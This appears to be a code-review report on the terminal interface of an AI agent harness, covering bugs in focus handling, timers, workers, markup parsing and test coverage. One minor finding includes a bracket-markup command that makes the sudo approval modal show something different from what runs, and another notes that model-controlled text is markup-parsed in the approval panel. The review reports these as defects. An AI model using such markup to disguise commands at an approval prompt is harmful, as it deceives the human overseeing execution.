app down — measured `RAN TURNS: 0`, the prompt never sent.

Startup half: `_load` catches only `json.JSONDecodeError`, so a history file with invalid
UTF-8 raises `UnicodeDecodeError` at `interfaces/cli/default_cmd.py:174` and **`marim`
refuses to launch at all** until the user finds and deletes the file. `prefs._read` catches
`(JSONDecodeError, OSError, UnicodeDecodeError)`.

### T-5 (major). A pending interaction panel can be left mounted but keyboard-unreachable — `tui/interactions/base.py:112-114`, `app.py:303`, `subagents/screen.py:94-107`
`run_panel`'s `finally` restores focus to the widget captured *before* mount,
unconditionally; `on_descendant_focus` declines to redirect focus while any
`InteractionPanel` exists, but nothing gives focus *back* to a panel that lost it.

Two reachable triggers, both verified in a real `HarnessApp`:
- **A second panel.** pydantic-ai 2.8 runs tool calls concurrently (`sequential` defaults
  to `False` and `tools/provider.py` never sets it), so `ask_user` + `present_plan` in one
  batch mount two panels. `_prompt_project_trust` (`app.py:288`) is another path — it runs
  as its own worker at mount and is *not* gated on `turn_busy`. With two panels up,
  resolving the first steals focus to `PromptInput`: pressing `a` **types the letter into
  the message box**, and Esc reaches the app binding and cancels the whole turn instead of
  answering the panel.
- **Ctrl+X while a panel is up.** `run_panel`'s docstring names this hazard and closes it
  *before* mounting, but nothing prevents `action_toggle_subagents` afterward. Verified:
  the panel loses focus and is covered; Esc closes the *viewer* while the approval stays
  pending. The turn appears wedged.

### T-4 (major). Spinner intervals are never stopped — `tui/subagents/card.py:189-195`, `tui/widgets/tools.py:188-196`
`SubAgentWidget.on_mount` discards its `set_interval` handle, so `finish()` cannot stop it —
a finished card's timer fires 10×/s for the session's life. `ToolCallWidget` stores
`self._spinner_timer` and stops it in `finish()` with a comment explaining exactly why
("so a finished session isn't left with hundreds of 10Hz no-op ticks"); the card never got
the same treatment. Separately, `_run_turn`'s `except CancelledError` (`app.py:1234-1239`)
doesn't settle in-flight tool widgets, so after one Esc during a `bash` call that row keeps
rebuilding its Collapsible title 10×/s and a killed spawn keeps animating (measured `_spin`
advancing 0→5 in 500 ms on a dead spawn). Visually a "still working" tool that never
finishes; mechanically N permanent repaint timers per cancelled turn.

### TUI minors
- **The first turn cancels the vision-capability probe** — `app.py:262`, `:898`:
  `run_worker(...)` with no `group=` lands in `"default"`, which the turn worker joins with
  `exclusive=True`, and Textual's `add_worker` calls `cancel_group`. Verified: submitting
  before the catalog returns leaves `_vision_caps` empty for the session, so
  `_image_block_reason` always returns `None` and a pasted screenshot goes to a text-only
  model with no warning. The codebase defends this exact hazard three times with explicit
  comments (`group="shell-passthrough"`, `"subagent-transcripts"`, `"notifications"`) —
  these two sites were missed.
- **`_run_turn`'s `finally` can strand the queue and kill the app** — `app.py:1246-1252`:
  the unguarded `query_one(CompactNotice)` raises `NoMatches` during teardown *before*
  `await self._after_turn()`, so the queue never drains, and the turn worker lacks
  `exit_on_error=False`. `StatusBar.refresh_title` guards the identical hazard with a
  comment naming this consequence, and `tests/test_app.py:864` pins the `set_busy` half —
  the `CompactNotice` line one below it was missed.
- **The sudo modal markup-parses the user's command** — `shell_passthrough.py:130`:
  `! sudo grep '[/]' /var/log/x` kills the app; `! sudo sh -c 'echo [b]hi[/b]'` *displays*
  `$ sudo sh -c 'echo hi'` while the bracketed form is what runs. `markup=False` fixes it.
- **`/exit` and `/quit` bypass the confirm-to-quit guard** — `commands.py:637` calls
  `app.exit()` rather than `action_quit`, silently discarding queued messages that `ctrl+c`
  would warn about. The docstring at `app.py:74-79` explicitly claims otherwise, and
  `tests/test_app.py:635` pins current behavior — so the docs are what's wrong.
- **`ModelPickerModal._load_catalog`** — `model_picker.py:91-105`: the one TUI worker with
  no error handling and `exit_on_error` left `True`.
- **Model/config-controlled text markup-parsed** in `interactions/approval.py:114` and
  `settings.py:503-504` (a `[/]` in a command denylist entry crashes the settings screen).
- **`start_system_turn`'s return value ignored** — `commands.py:295`, `:327`: `/remember`
  and `/skill` report success even when the spawn was refused.
- **`PromptInput` reads attachment bytes inside the key handler** — `widgets/prompt.py:123`,
  `:142`: `atts = [(p.read_bytes(), m) for p, m in self.attachments]` runs inside `_on_key`.
  Verified: attach an image, unlink the cached file, press Enter → `FileNotFoundError`
  propagates through `message_pump._dispatch_message` and takes down the app, losing the
  draft and any queued messages.
- **Repeated identical `/compact` failure leaves a permanent phantom spinner** —
  `widgets/compact_notice.py:49-54` + `commands.py:88`: `compacting` is `always_update=True`
  but `error_msg` is not, and nothing on the failure path clears `compacting`. Verified: two
  `/compact` failures with the *same* message (a down summarizer endpoint — the common case)
  leave the notice reading "⟳ Compacting conversation…" indefinitely with nothing running.
- **`dirty_streams` grows without bound for unviewed sub-agent transcripts** —
  `stream_render.py:641-657`: a hidden stream is re-added every tick and never flushed, so
  after a large fan-out the ~12.5 Hz tick walks the parent chain for every stranded widget
  forever. Only a session switch clears it. Related: `reset()` clears `dirty_streams` but not
  `dirty_usage_cards` (`:484-500` vs `:463`), `prune_completed` never reclaims a cancelled
  turn's tool widgets (`:604-610`), and `workflow_cards` (`:442`) is never pruned.

### TUI nits
`subagents/screen.py:32` subclasses `Screen` purely to borrow `reactive` and never mounts it
(honestly documented, but carries inert machinery) · `stream_render.py:355-365`
unconditionally pops `_SubStreamState` on result, dropping a background spawn's stream
pointer in a one-round-trip window · `widgets/prompt.py:143` writes paste-*expanded* text to
`prompt_history.jsonl`, so a 600 KB blob is stored verbatim and returns on Up-arrow — the
opposite of what `_maybe_collapse_paste` exists for · `widgets/prompt.py:90-98` Esc while the
slash menu is open takes two presses to cancel a turn.

### TUI strengths (verified)
- **The approval path's core invariants hold.** `resolve_approvals`
  (`runtime/permissions.py:153-177`) walks approvals in a `for` loop and awaits each callback,
  so a second approval can never race a mounted panel; what the panel shows
  (`call.tool_name`, `call.args_as_dict()`) is exactly what pydantic-ai executes.
- **Cancel fails closed.** A cancelled turn never resolves `panel.result`; `CancelledError`
  propagates out of `run_panel`'s await, `_request_approval` never returns, the tool never
  runs. `Esc` on `ApprovalPanel` is bound to `deny` specifically so a reflexive Esc doesn't
  fall through to `cancel_turn`; `TrustPanel` has no third undecided state.
- **`run_panel`'s two pre-mount steps are correct and explained** (`interactions/base.py:76-108`):
  mounting into `screen_stack[0]` is what stops an approval firing under an open modal from
  `NoMatches`-ing into the turn loop.
- **`AssistantMessage`'s streaming machinery** (`messages.py:212-352`) is the best code in the
  layer: incremental `Markdown.append` for O(n) rather than O(n²), an `_inflight`
  `AwaitComplete` gate serializing appends so a fan-out can't double-mount blocks, and a
  `_MAX_RENDER` tail bound with a measured justification.
- **CPU work is kept off the loop** — Pygments highlighting and the edit-diff read render
  plain first and swap in via `asyncio.to_thread`.
- **Worker discipline is right in five of seven places**, each with a comment naming the
  hazard; `ProvidersPane` goes further with per-provider exclusive verify groups.
- **Secret handling in Settings is careful** — key inputs start empty with a last-4
  placeholder, an empty commit is a documented no-op so blur can't clobber a stored key.
- `interfaces/terminal.py` is a model capability probe: cbreak not raw so Ctrl-C still works,
  `termios.error` handled separately from `OSError` because it isn't one, `finally` restore.

### TUI coverage
`interfaces/tui/` 88.9% (4492/5055); root leaves 82.4%; combined 88.5%. Weakest:
`thinking_picker.py` 44%, `math_markdown.py` 54%, `shell_passthrough.py` 66%,
`providers.py` 71%, `commands.py` 75%. Strongest: `stream_render.py` 95.5%,
`session_view.py` 97.5%, `prompt.py` 97%, `approval.py`/`tools.py`/`card.py` 97-99%.

**The number is good; the shape has the same blind spot as everywhere else.** Coverage is
overwhelmingly *behavioral* — "does the right value come back," "is the right widget
mounted." Almost nothing tests **rendering under adversarial content or failure**, which is
precisely where all four majors live. `test_queue.py:33` tests the one bracket shape that
works. `test_approval.py` tests `format_detail` as a pure function and never mounts the panel
to assert rendered height — while `test_ask_user_panel.py:210-295` *does* test overflow, the
hint line, and height math for the sibling panel. `test_history.py` never exercises a write
failure. `test_app.py:864` is exactly the right kind of test and stops one line short of the
`CompactNotice` access in the same `finally`.

Two cheap additions would have caught four of the six: extending the existing
`test_widgets.py:352-413` `*_survive_markup_like_text` family (it covers log messages, tool
widgets, sub-agent cards, and task/job panels — but not the queue display or the sudo modal),
and a "worker survives a turn start" assertion for every `run_worker` call site.
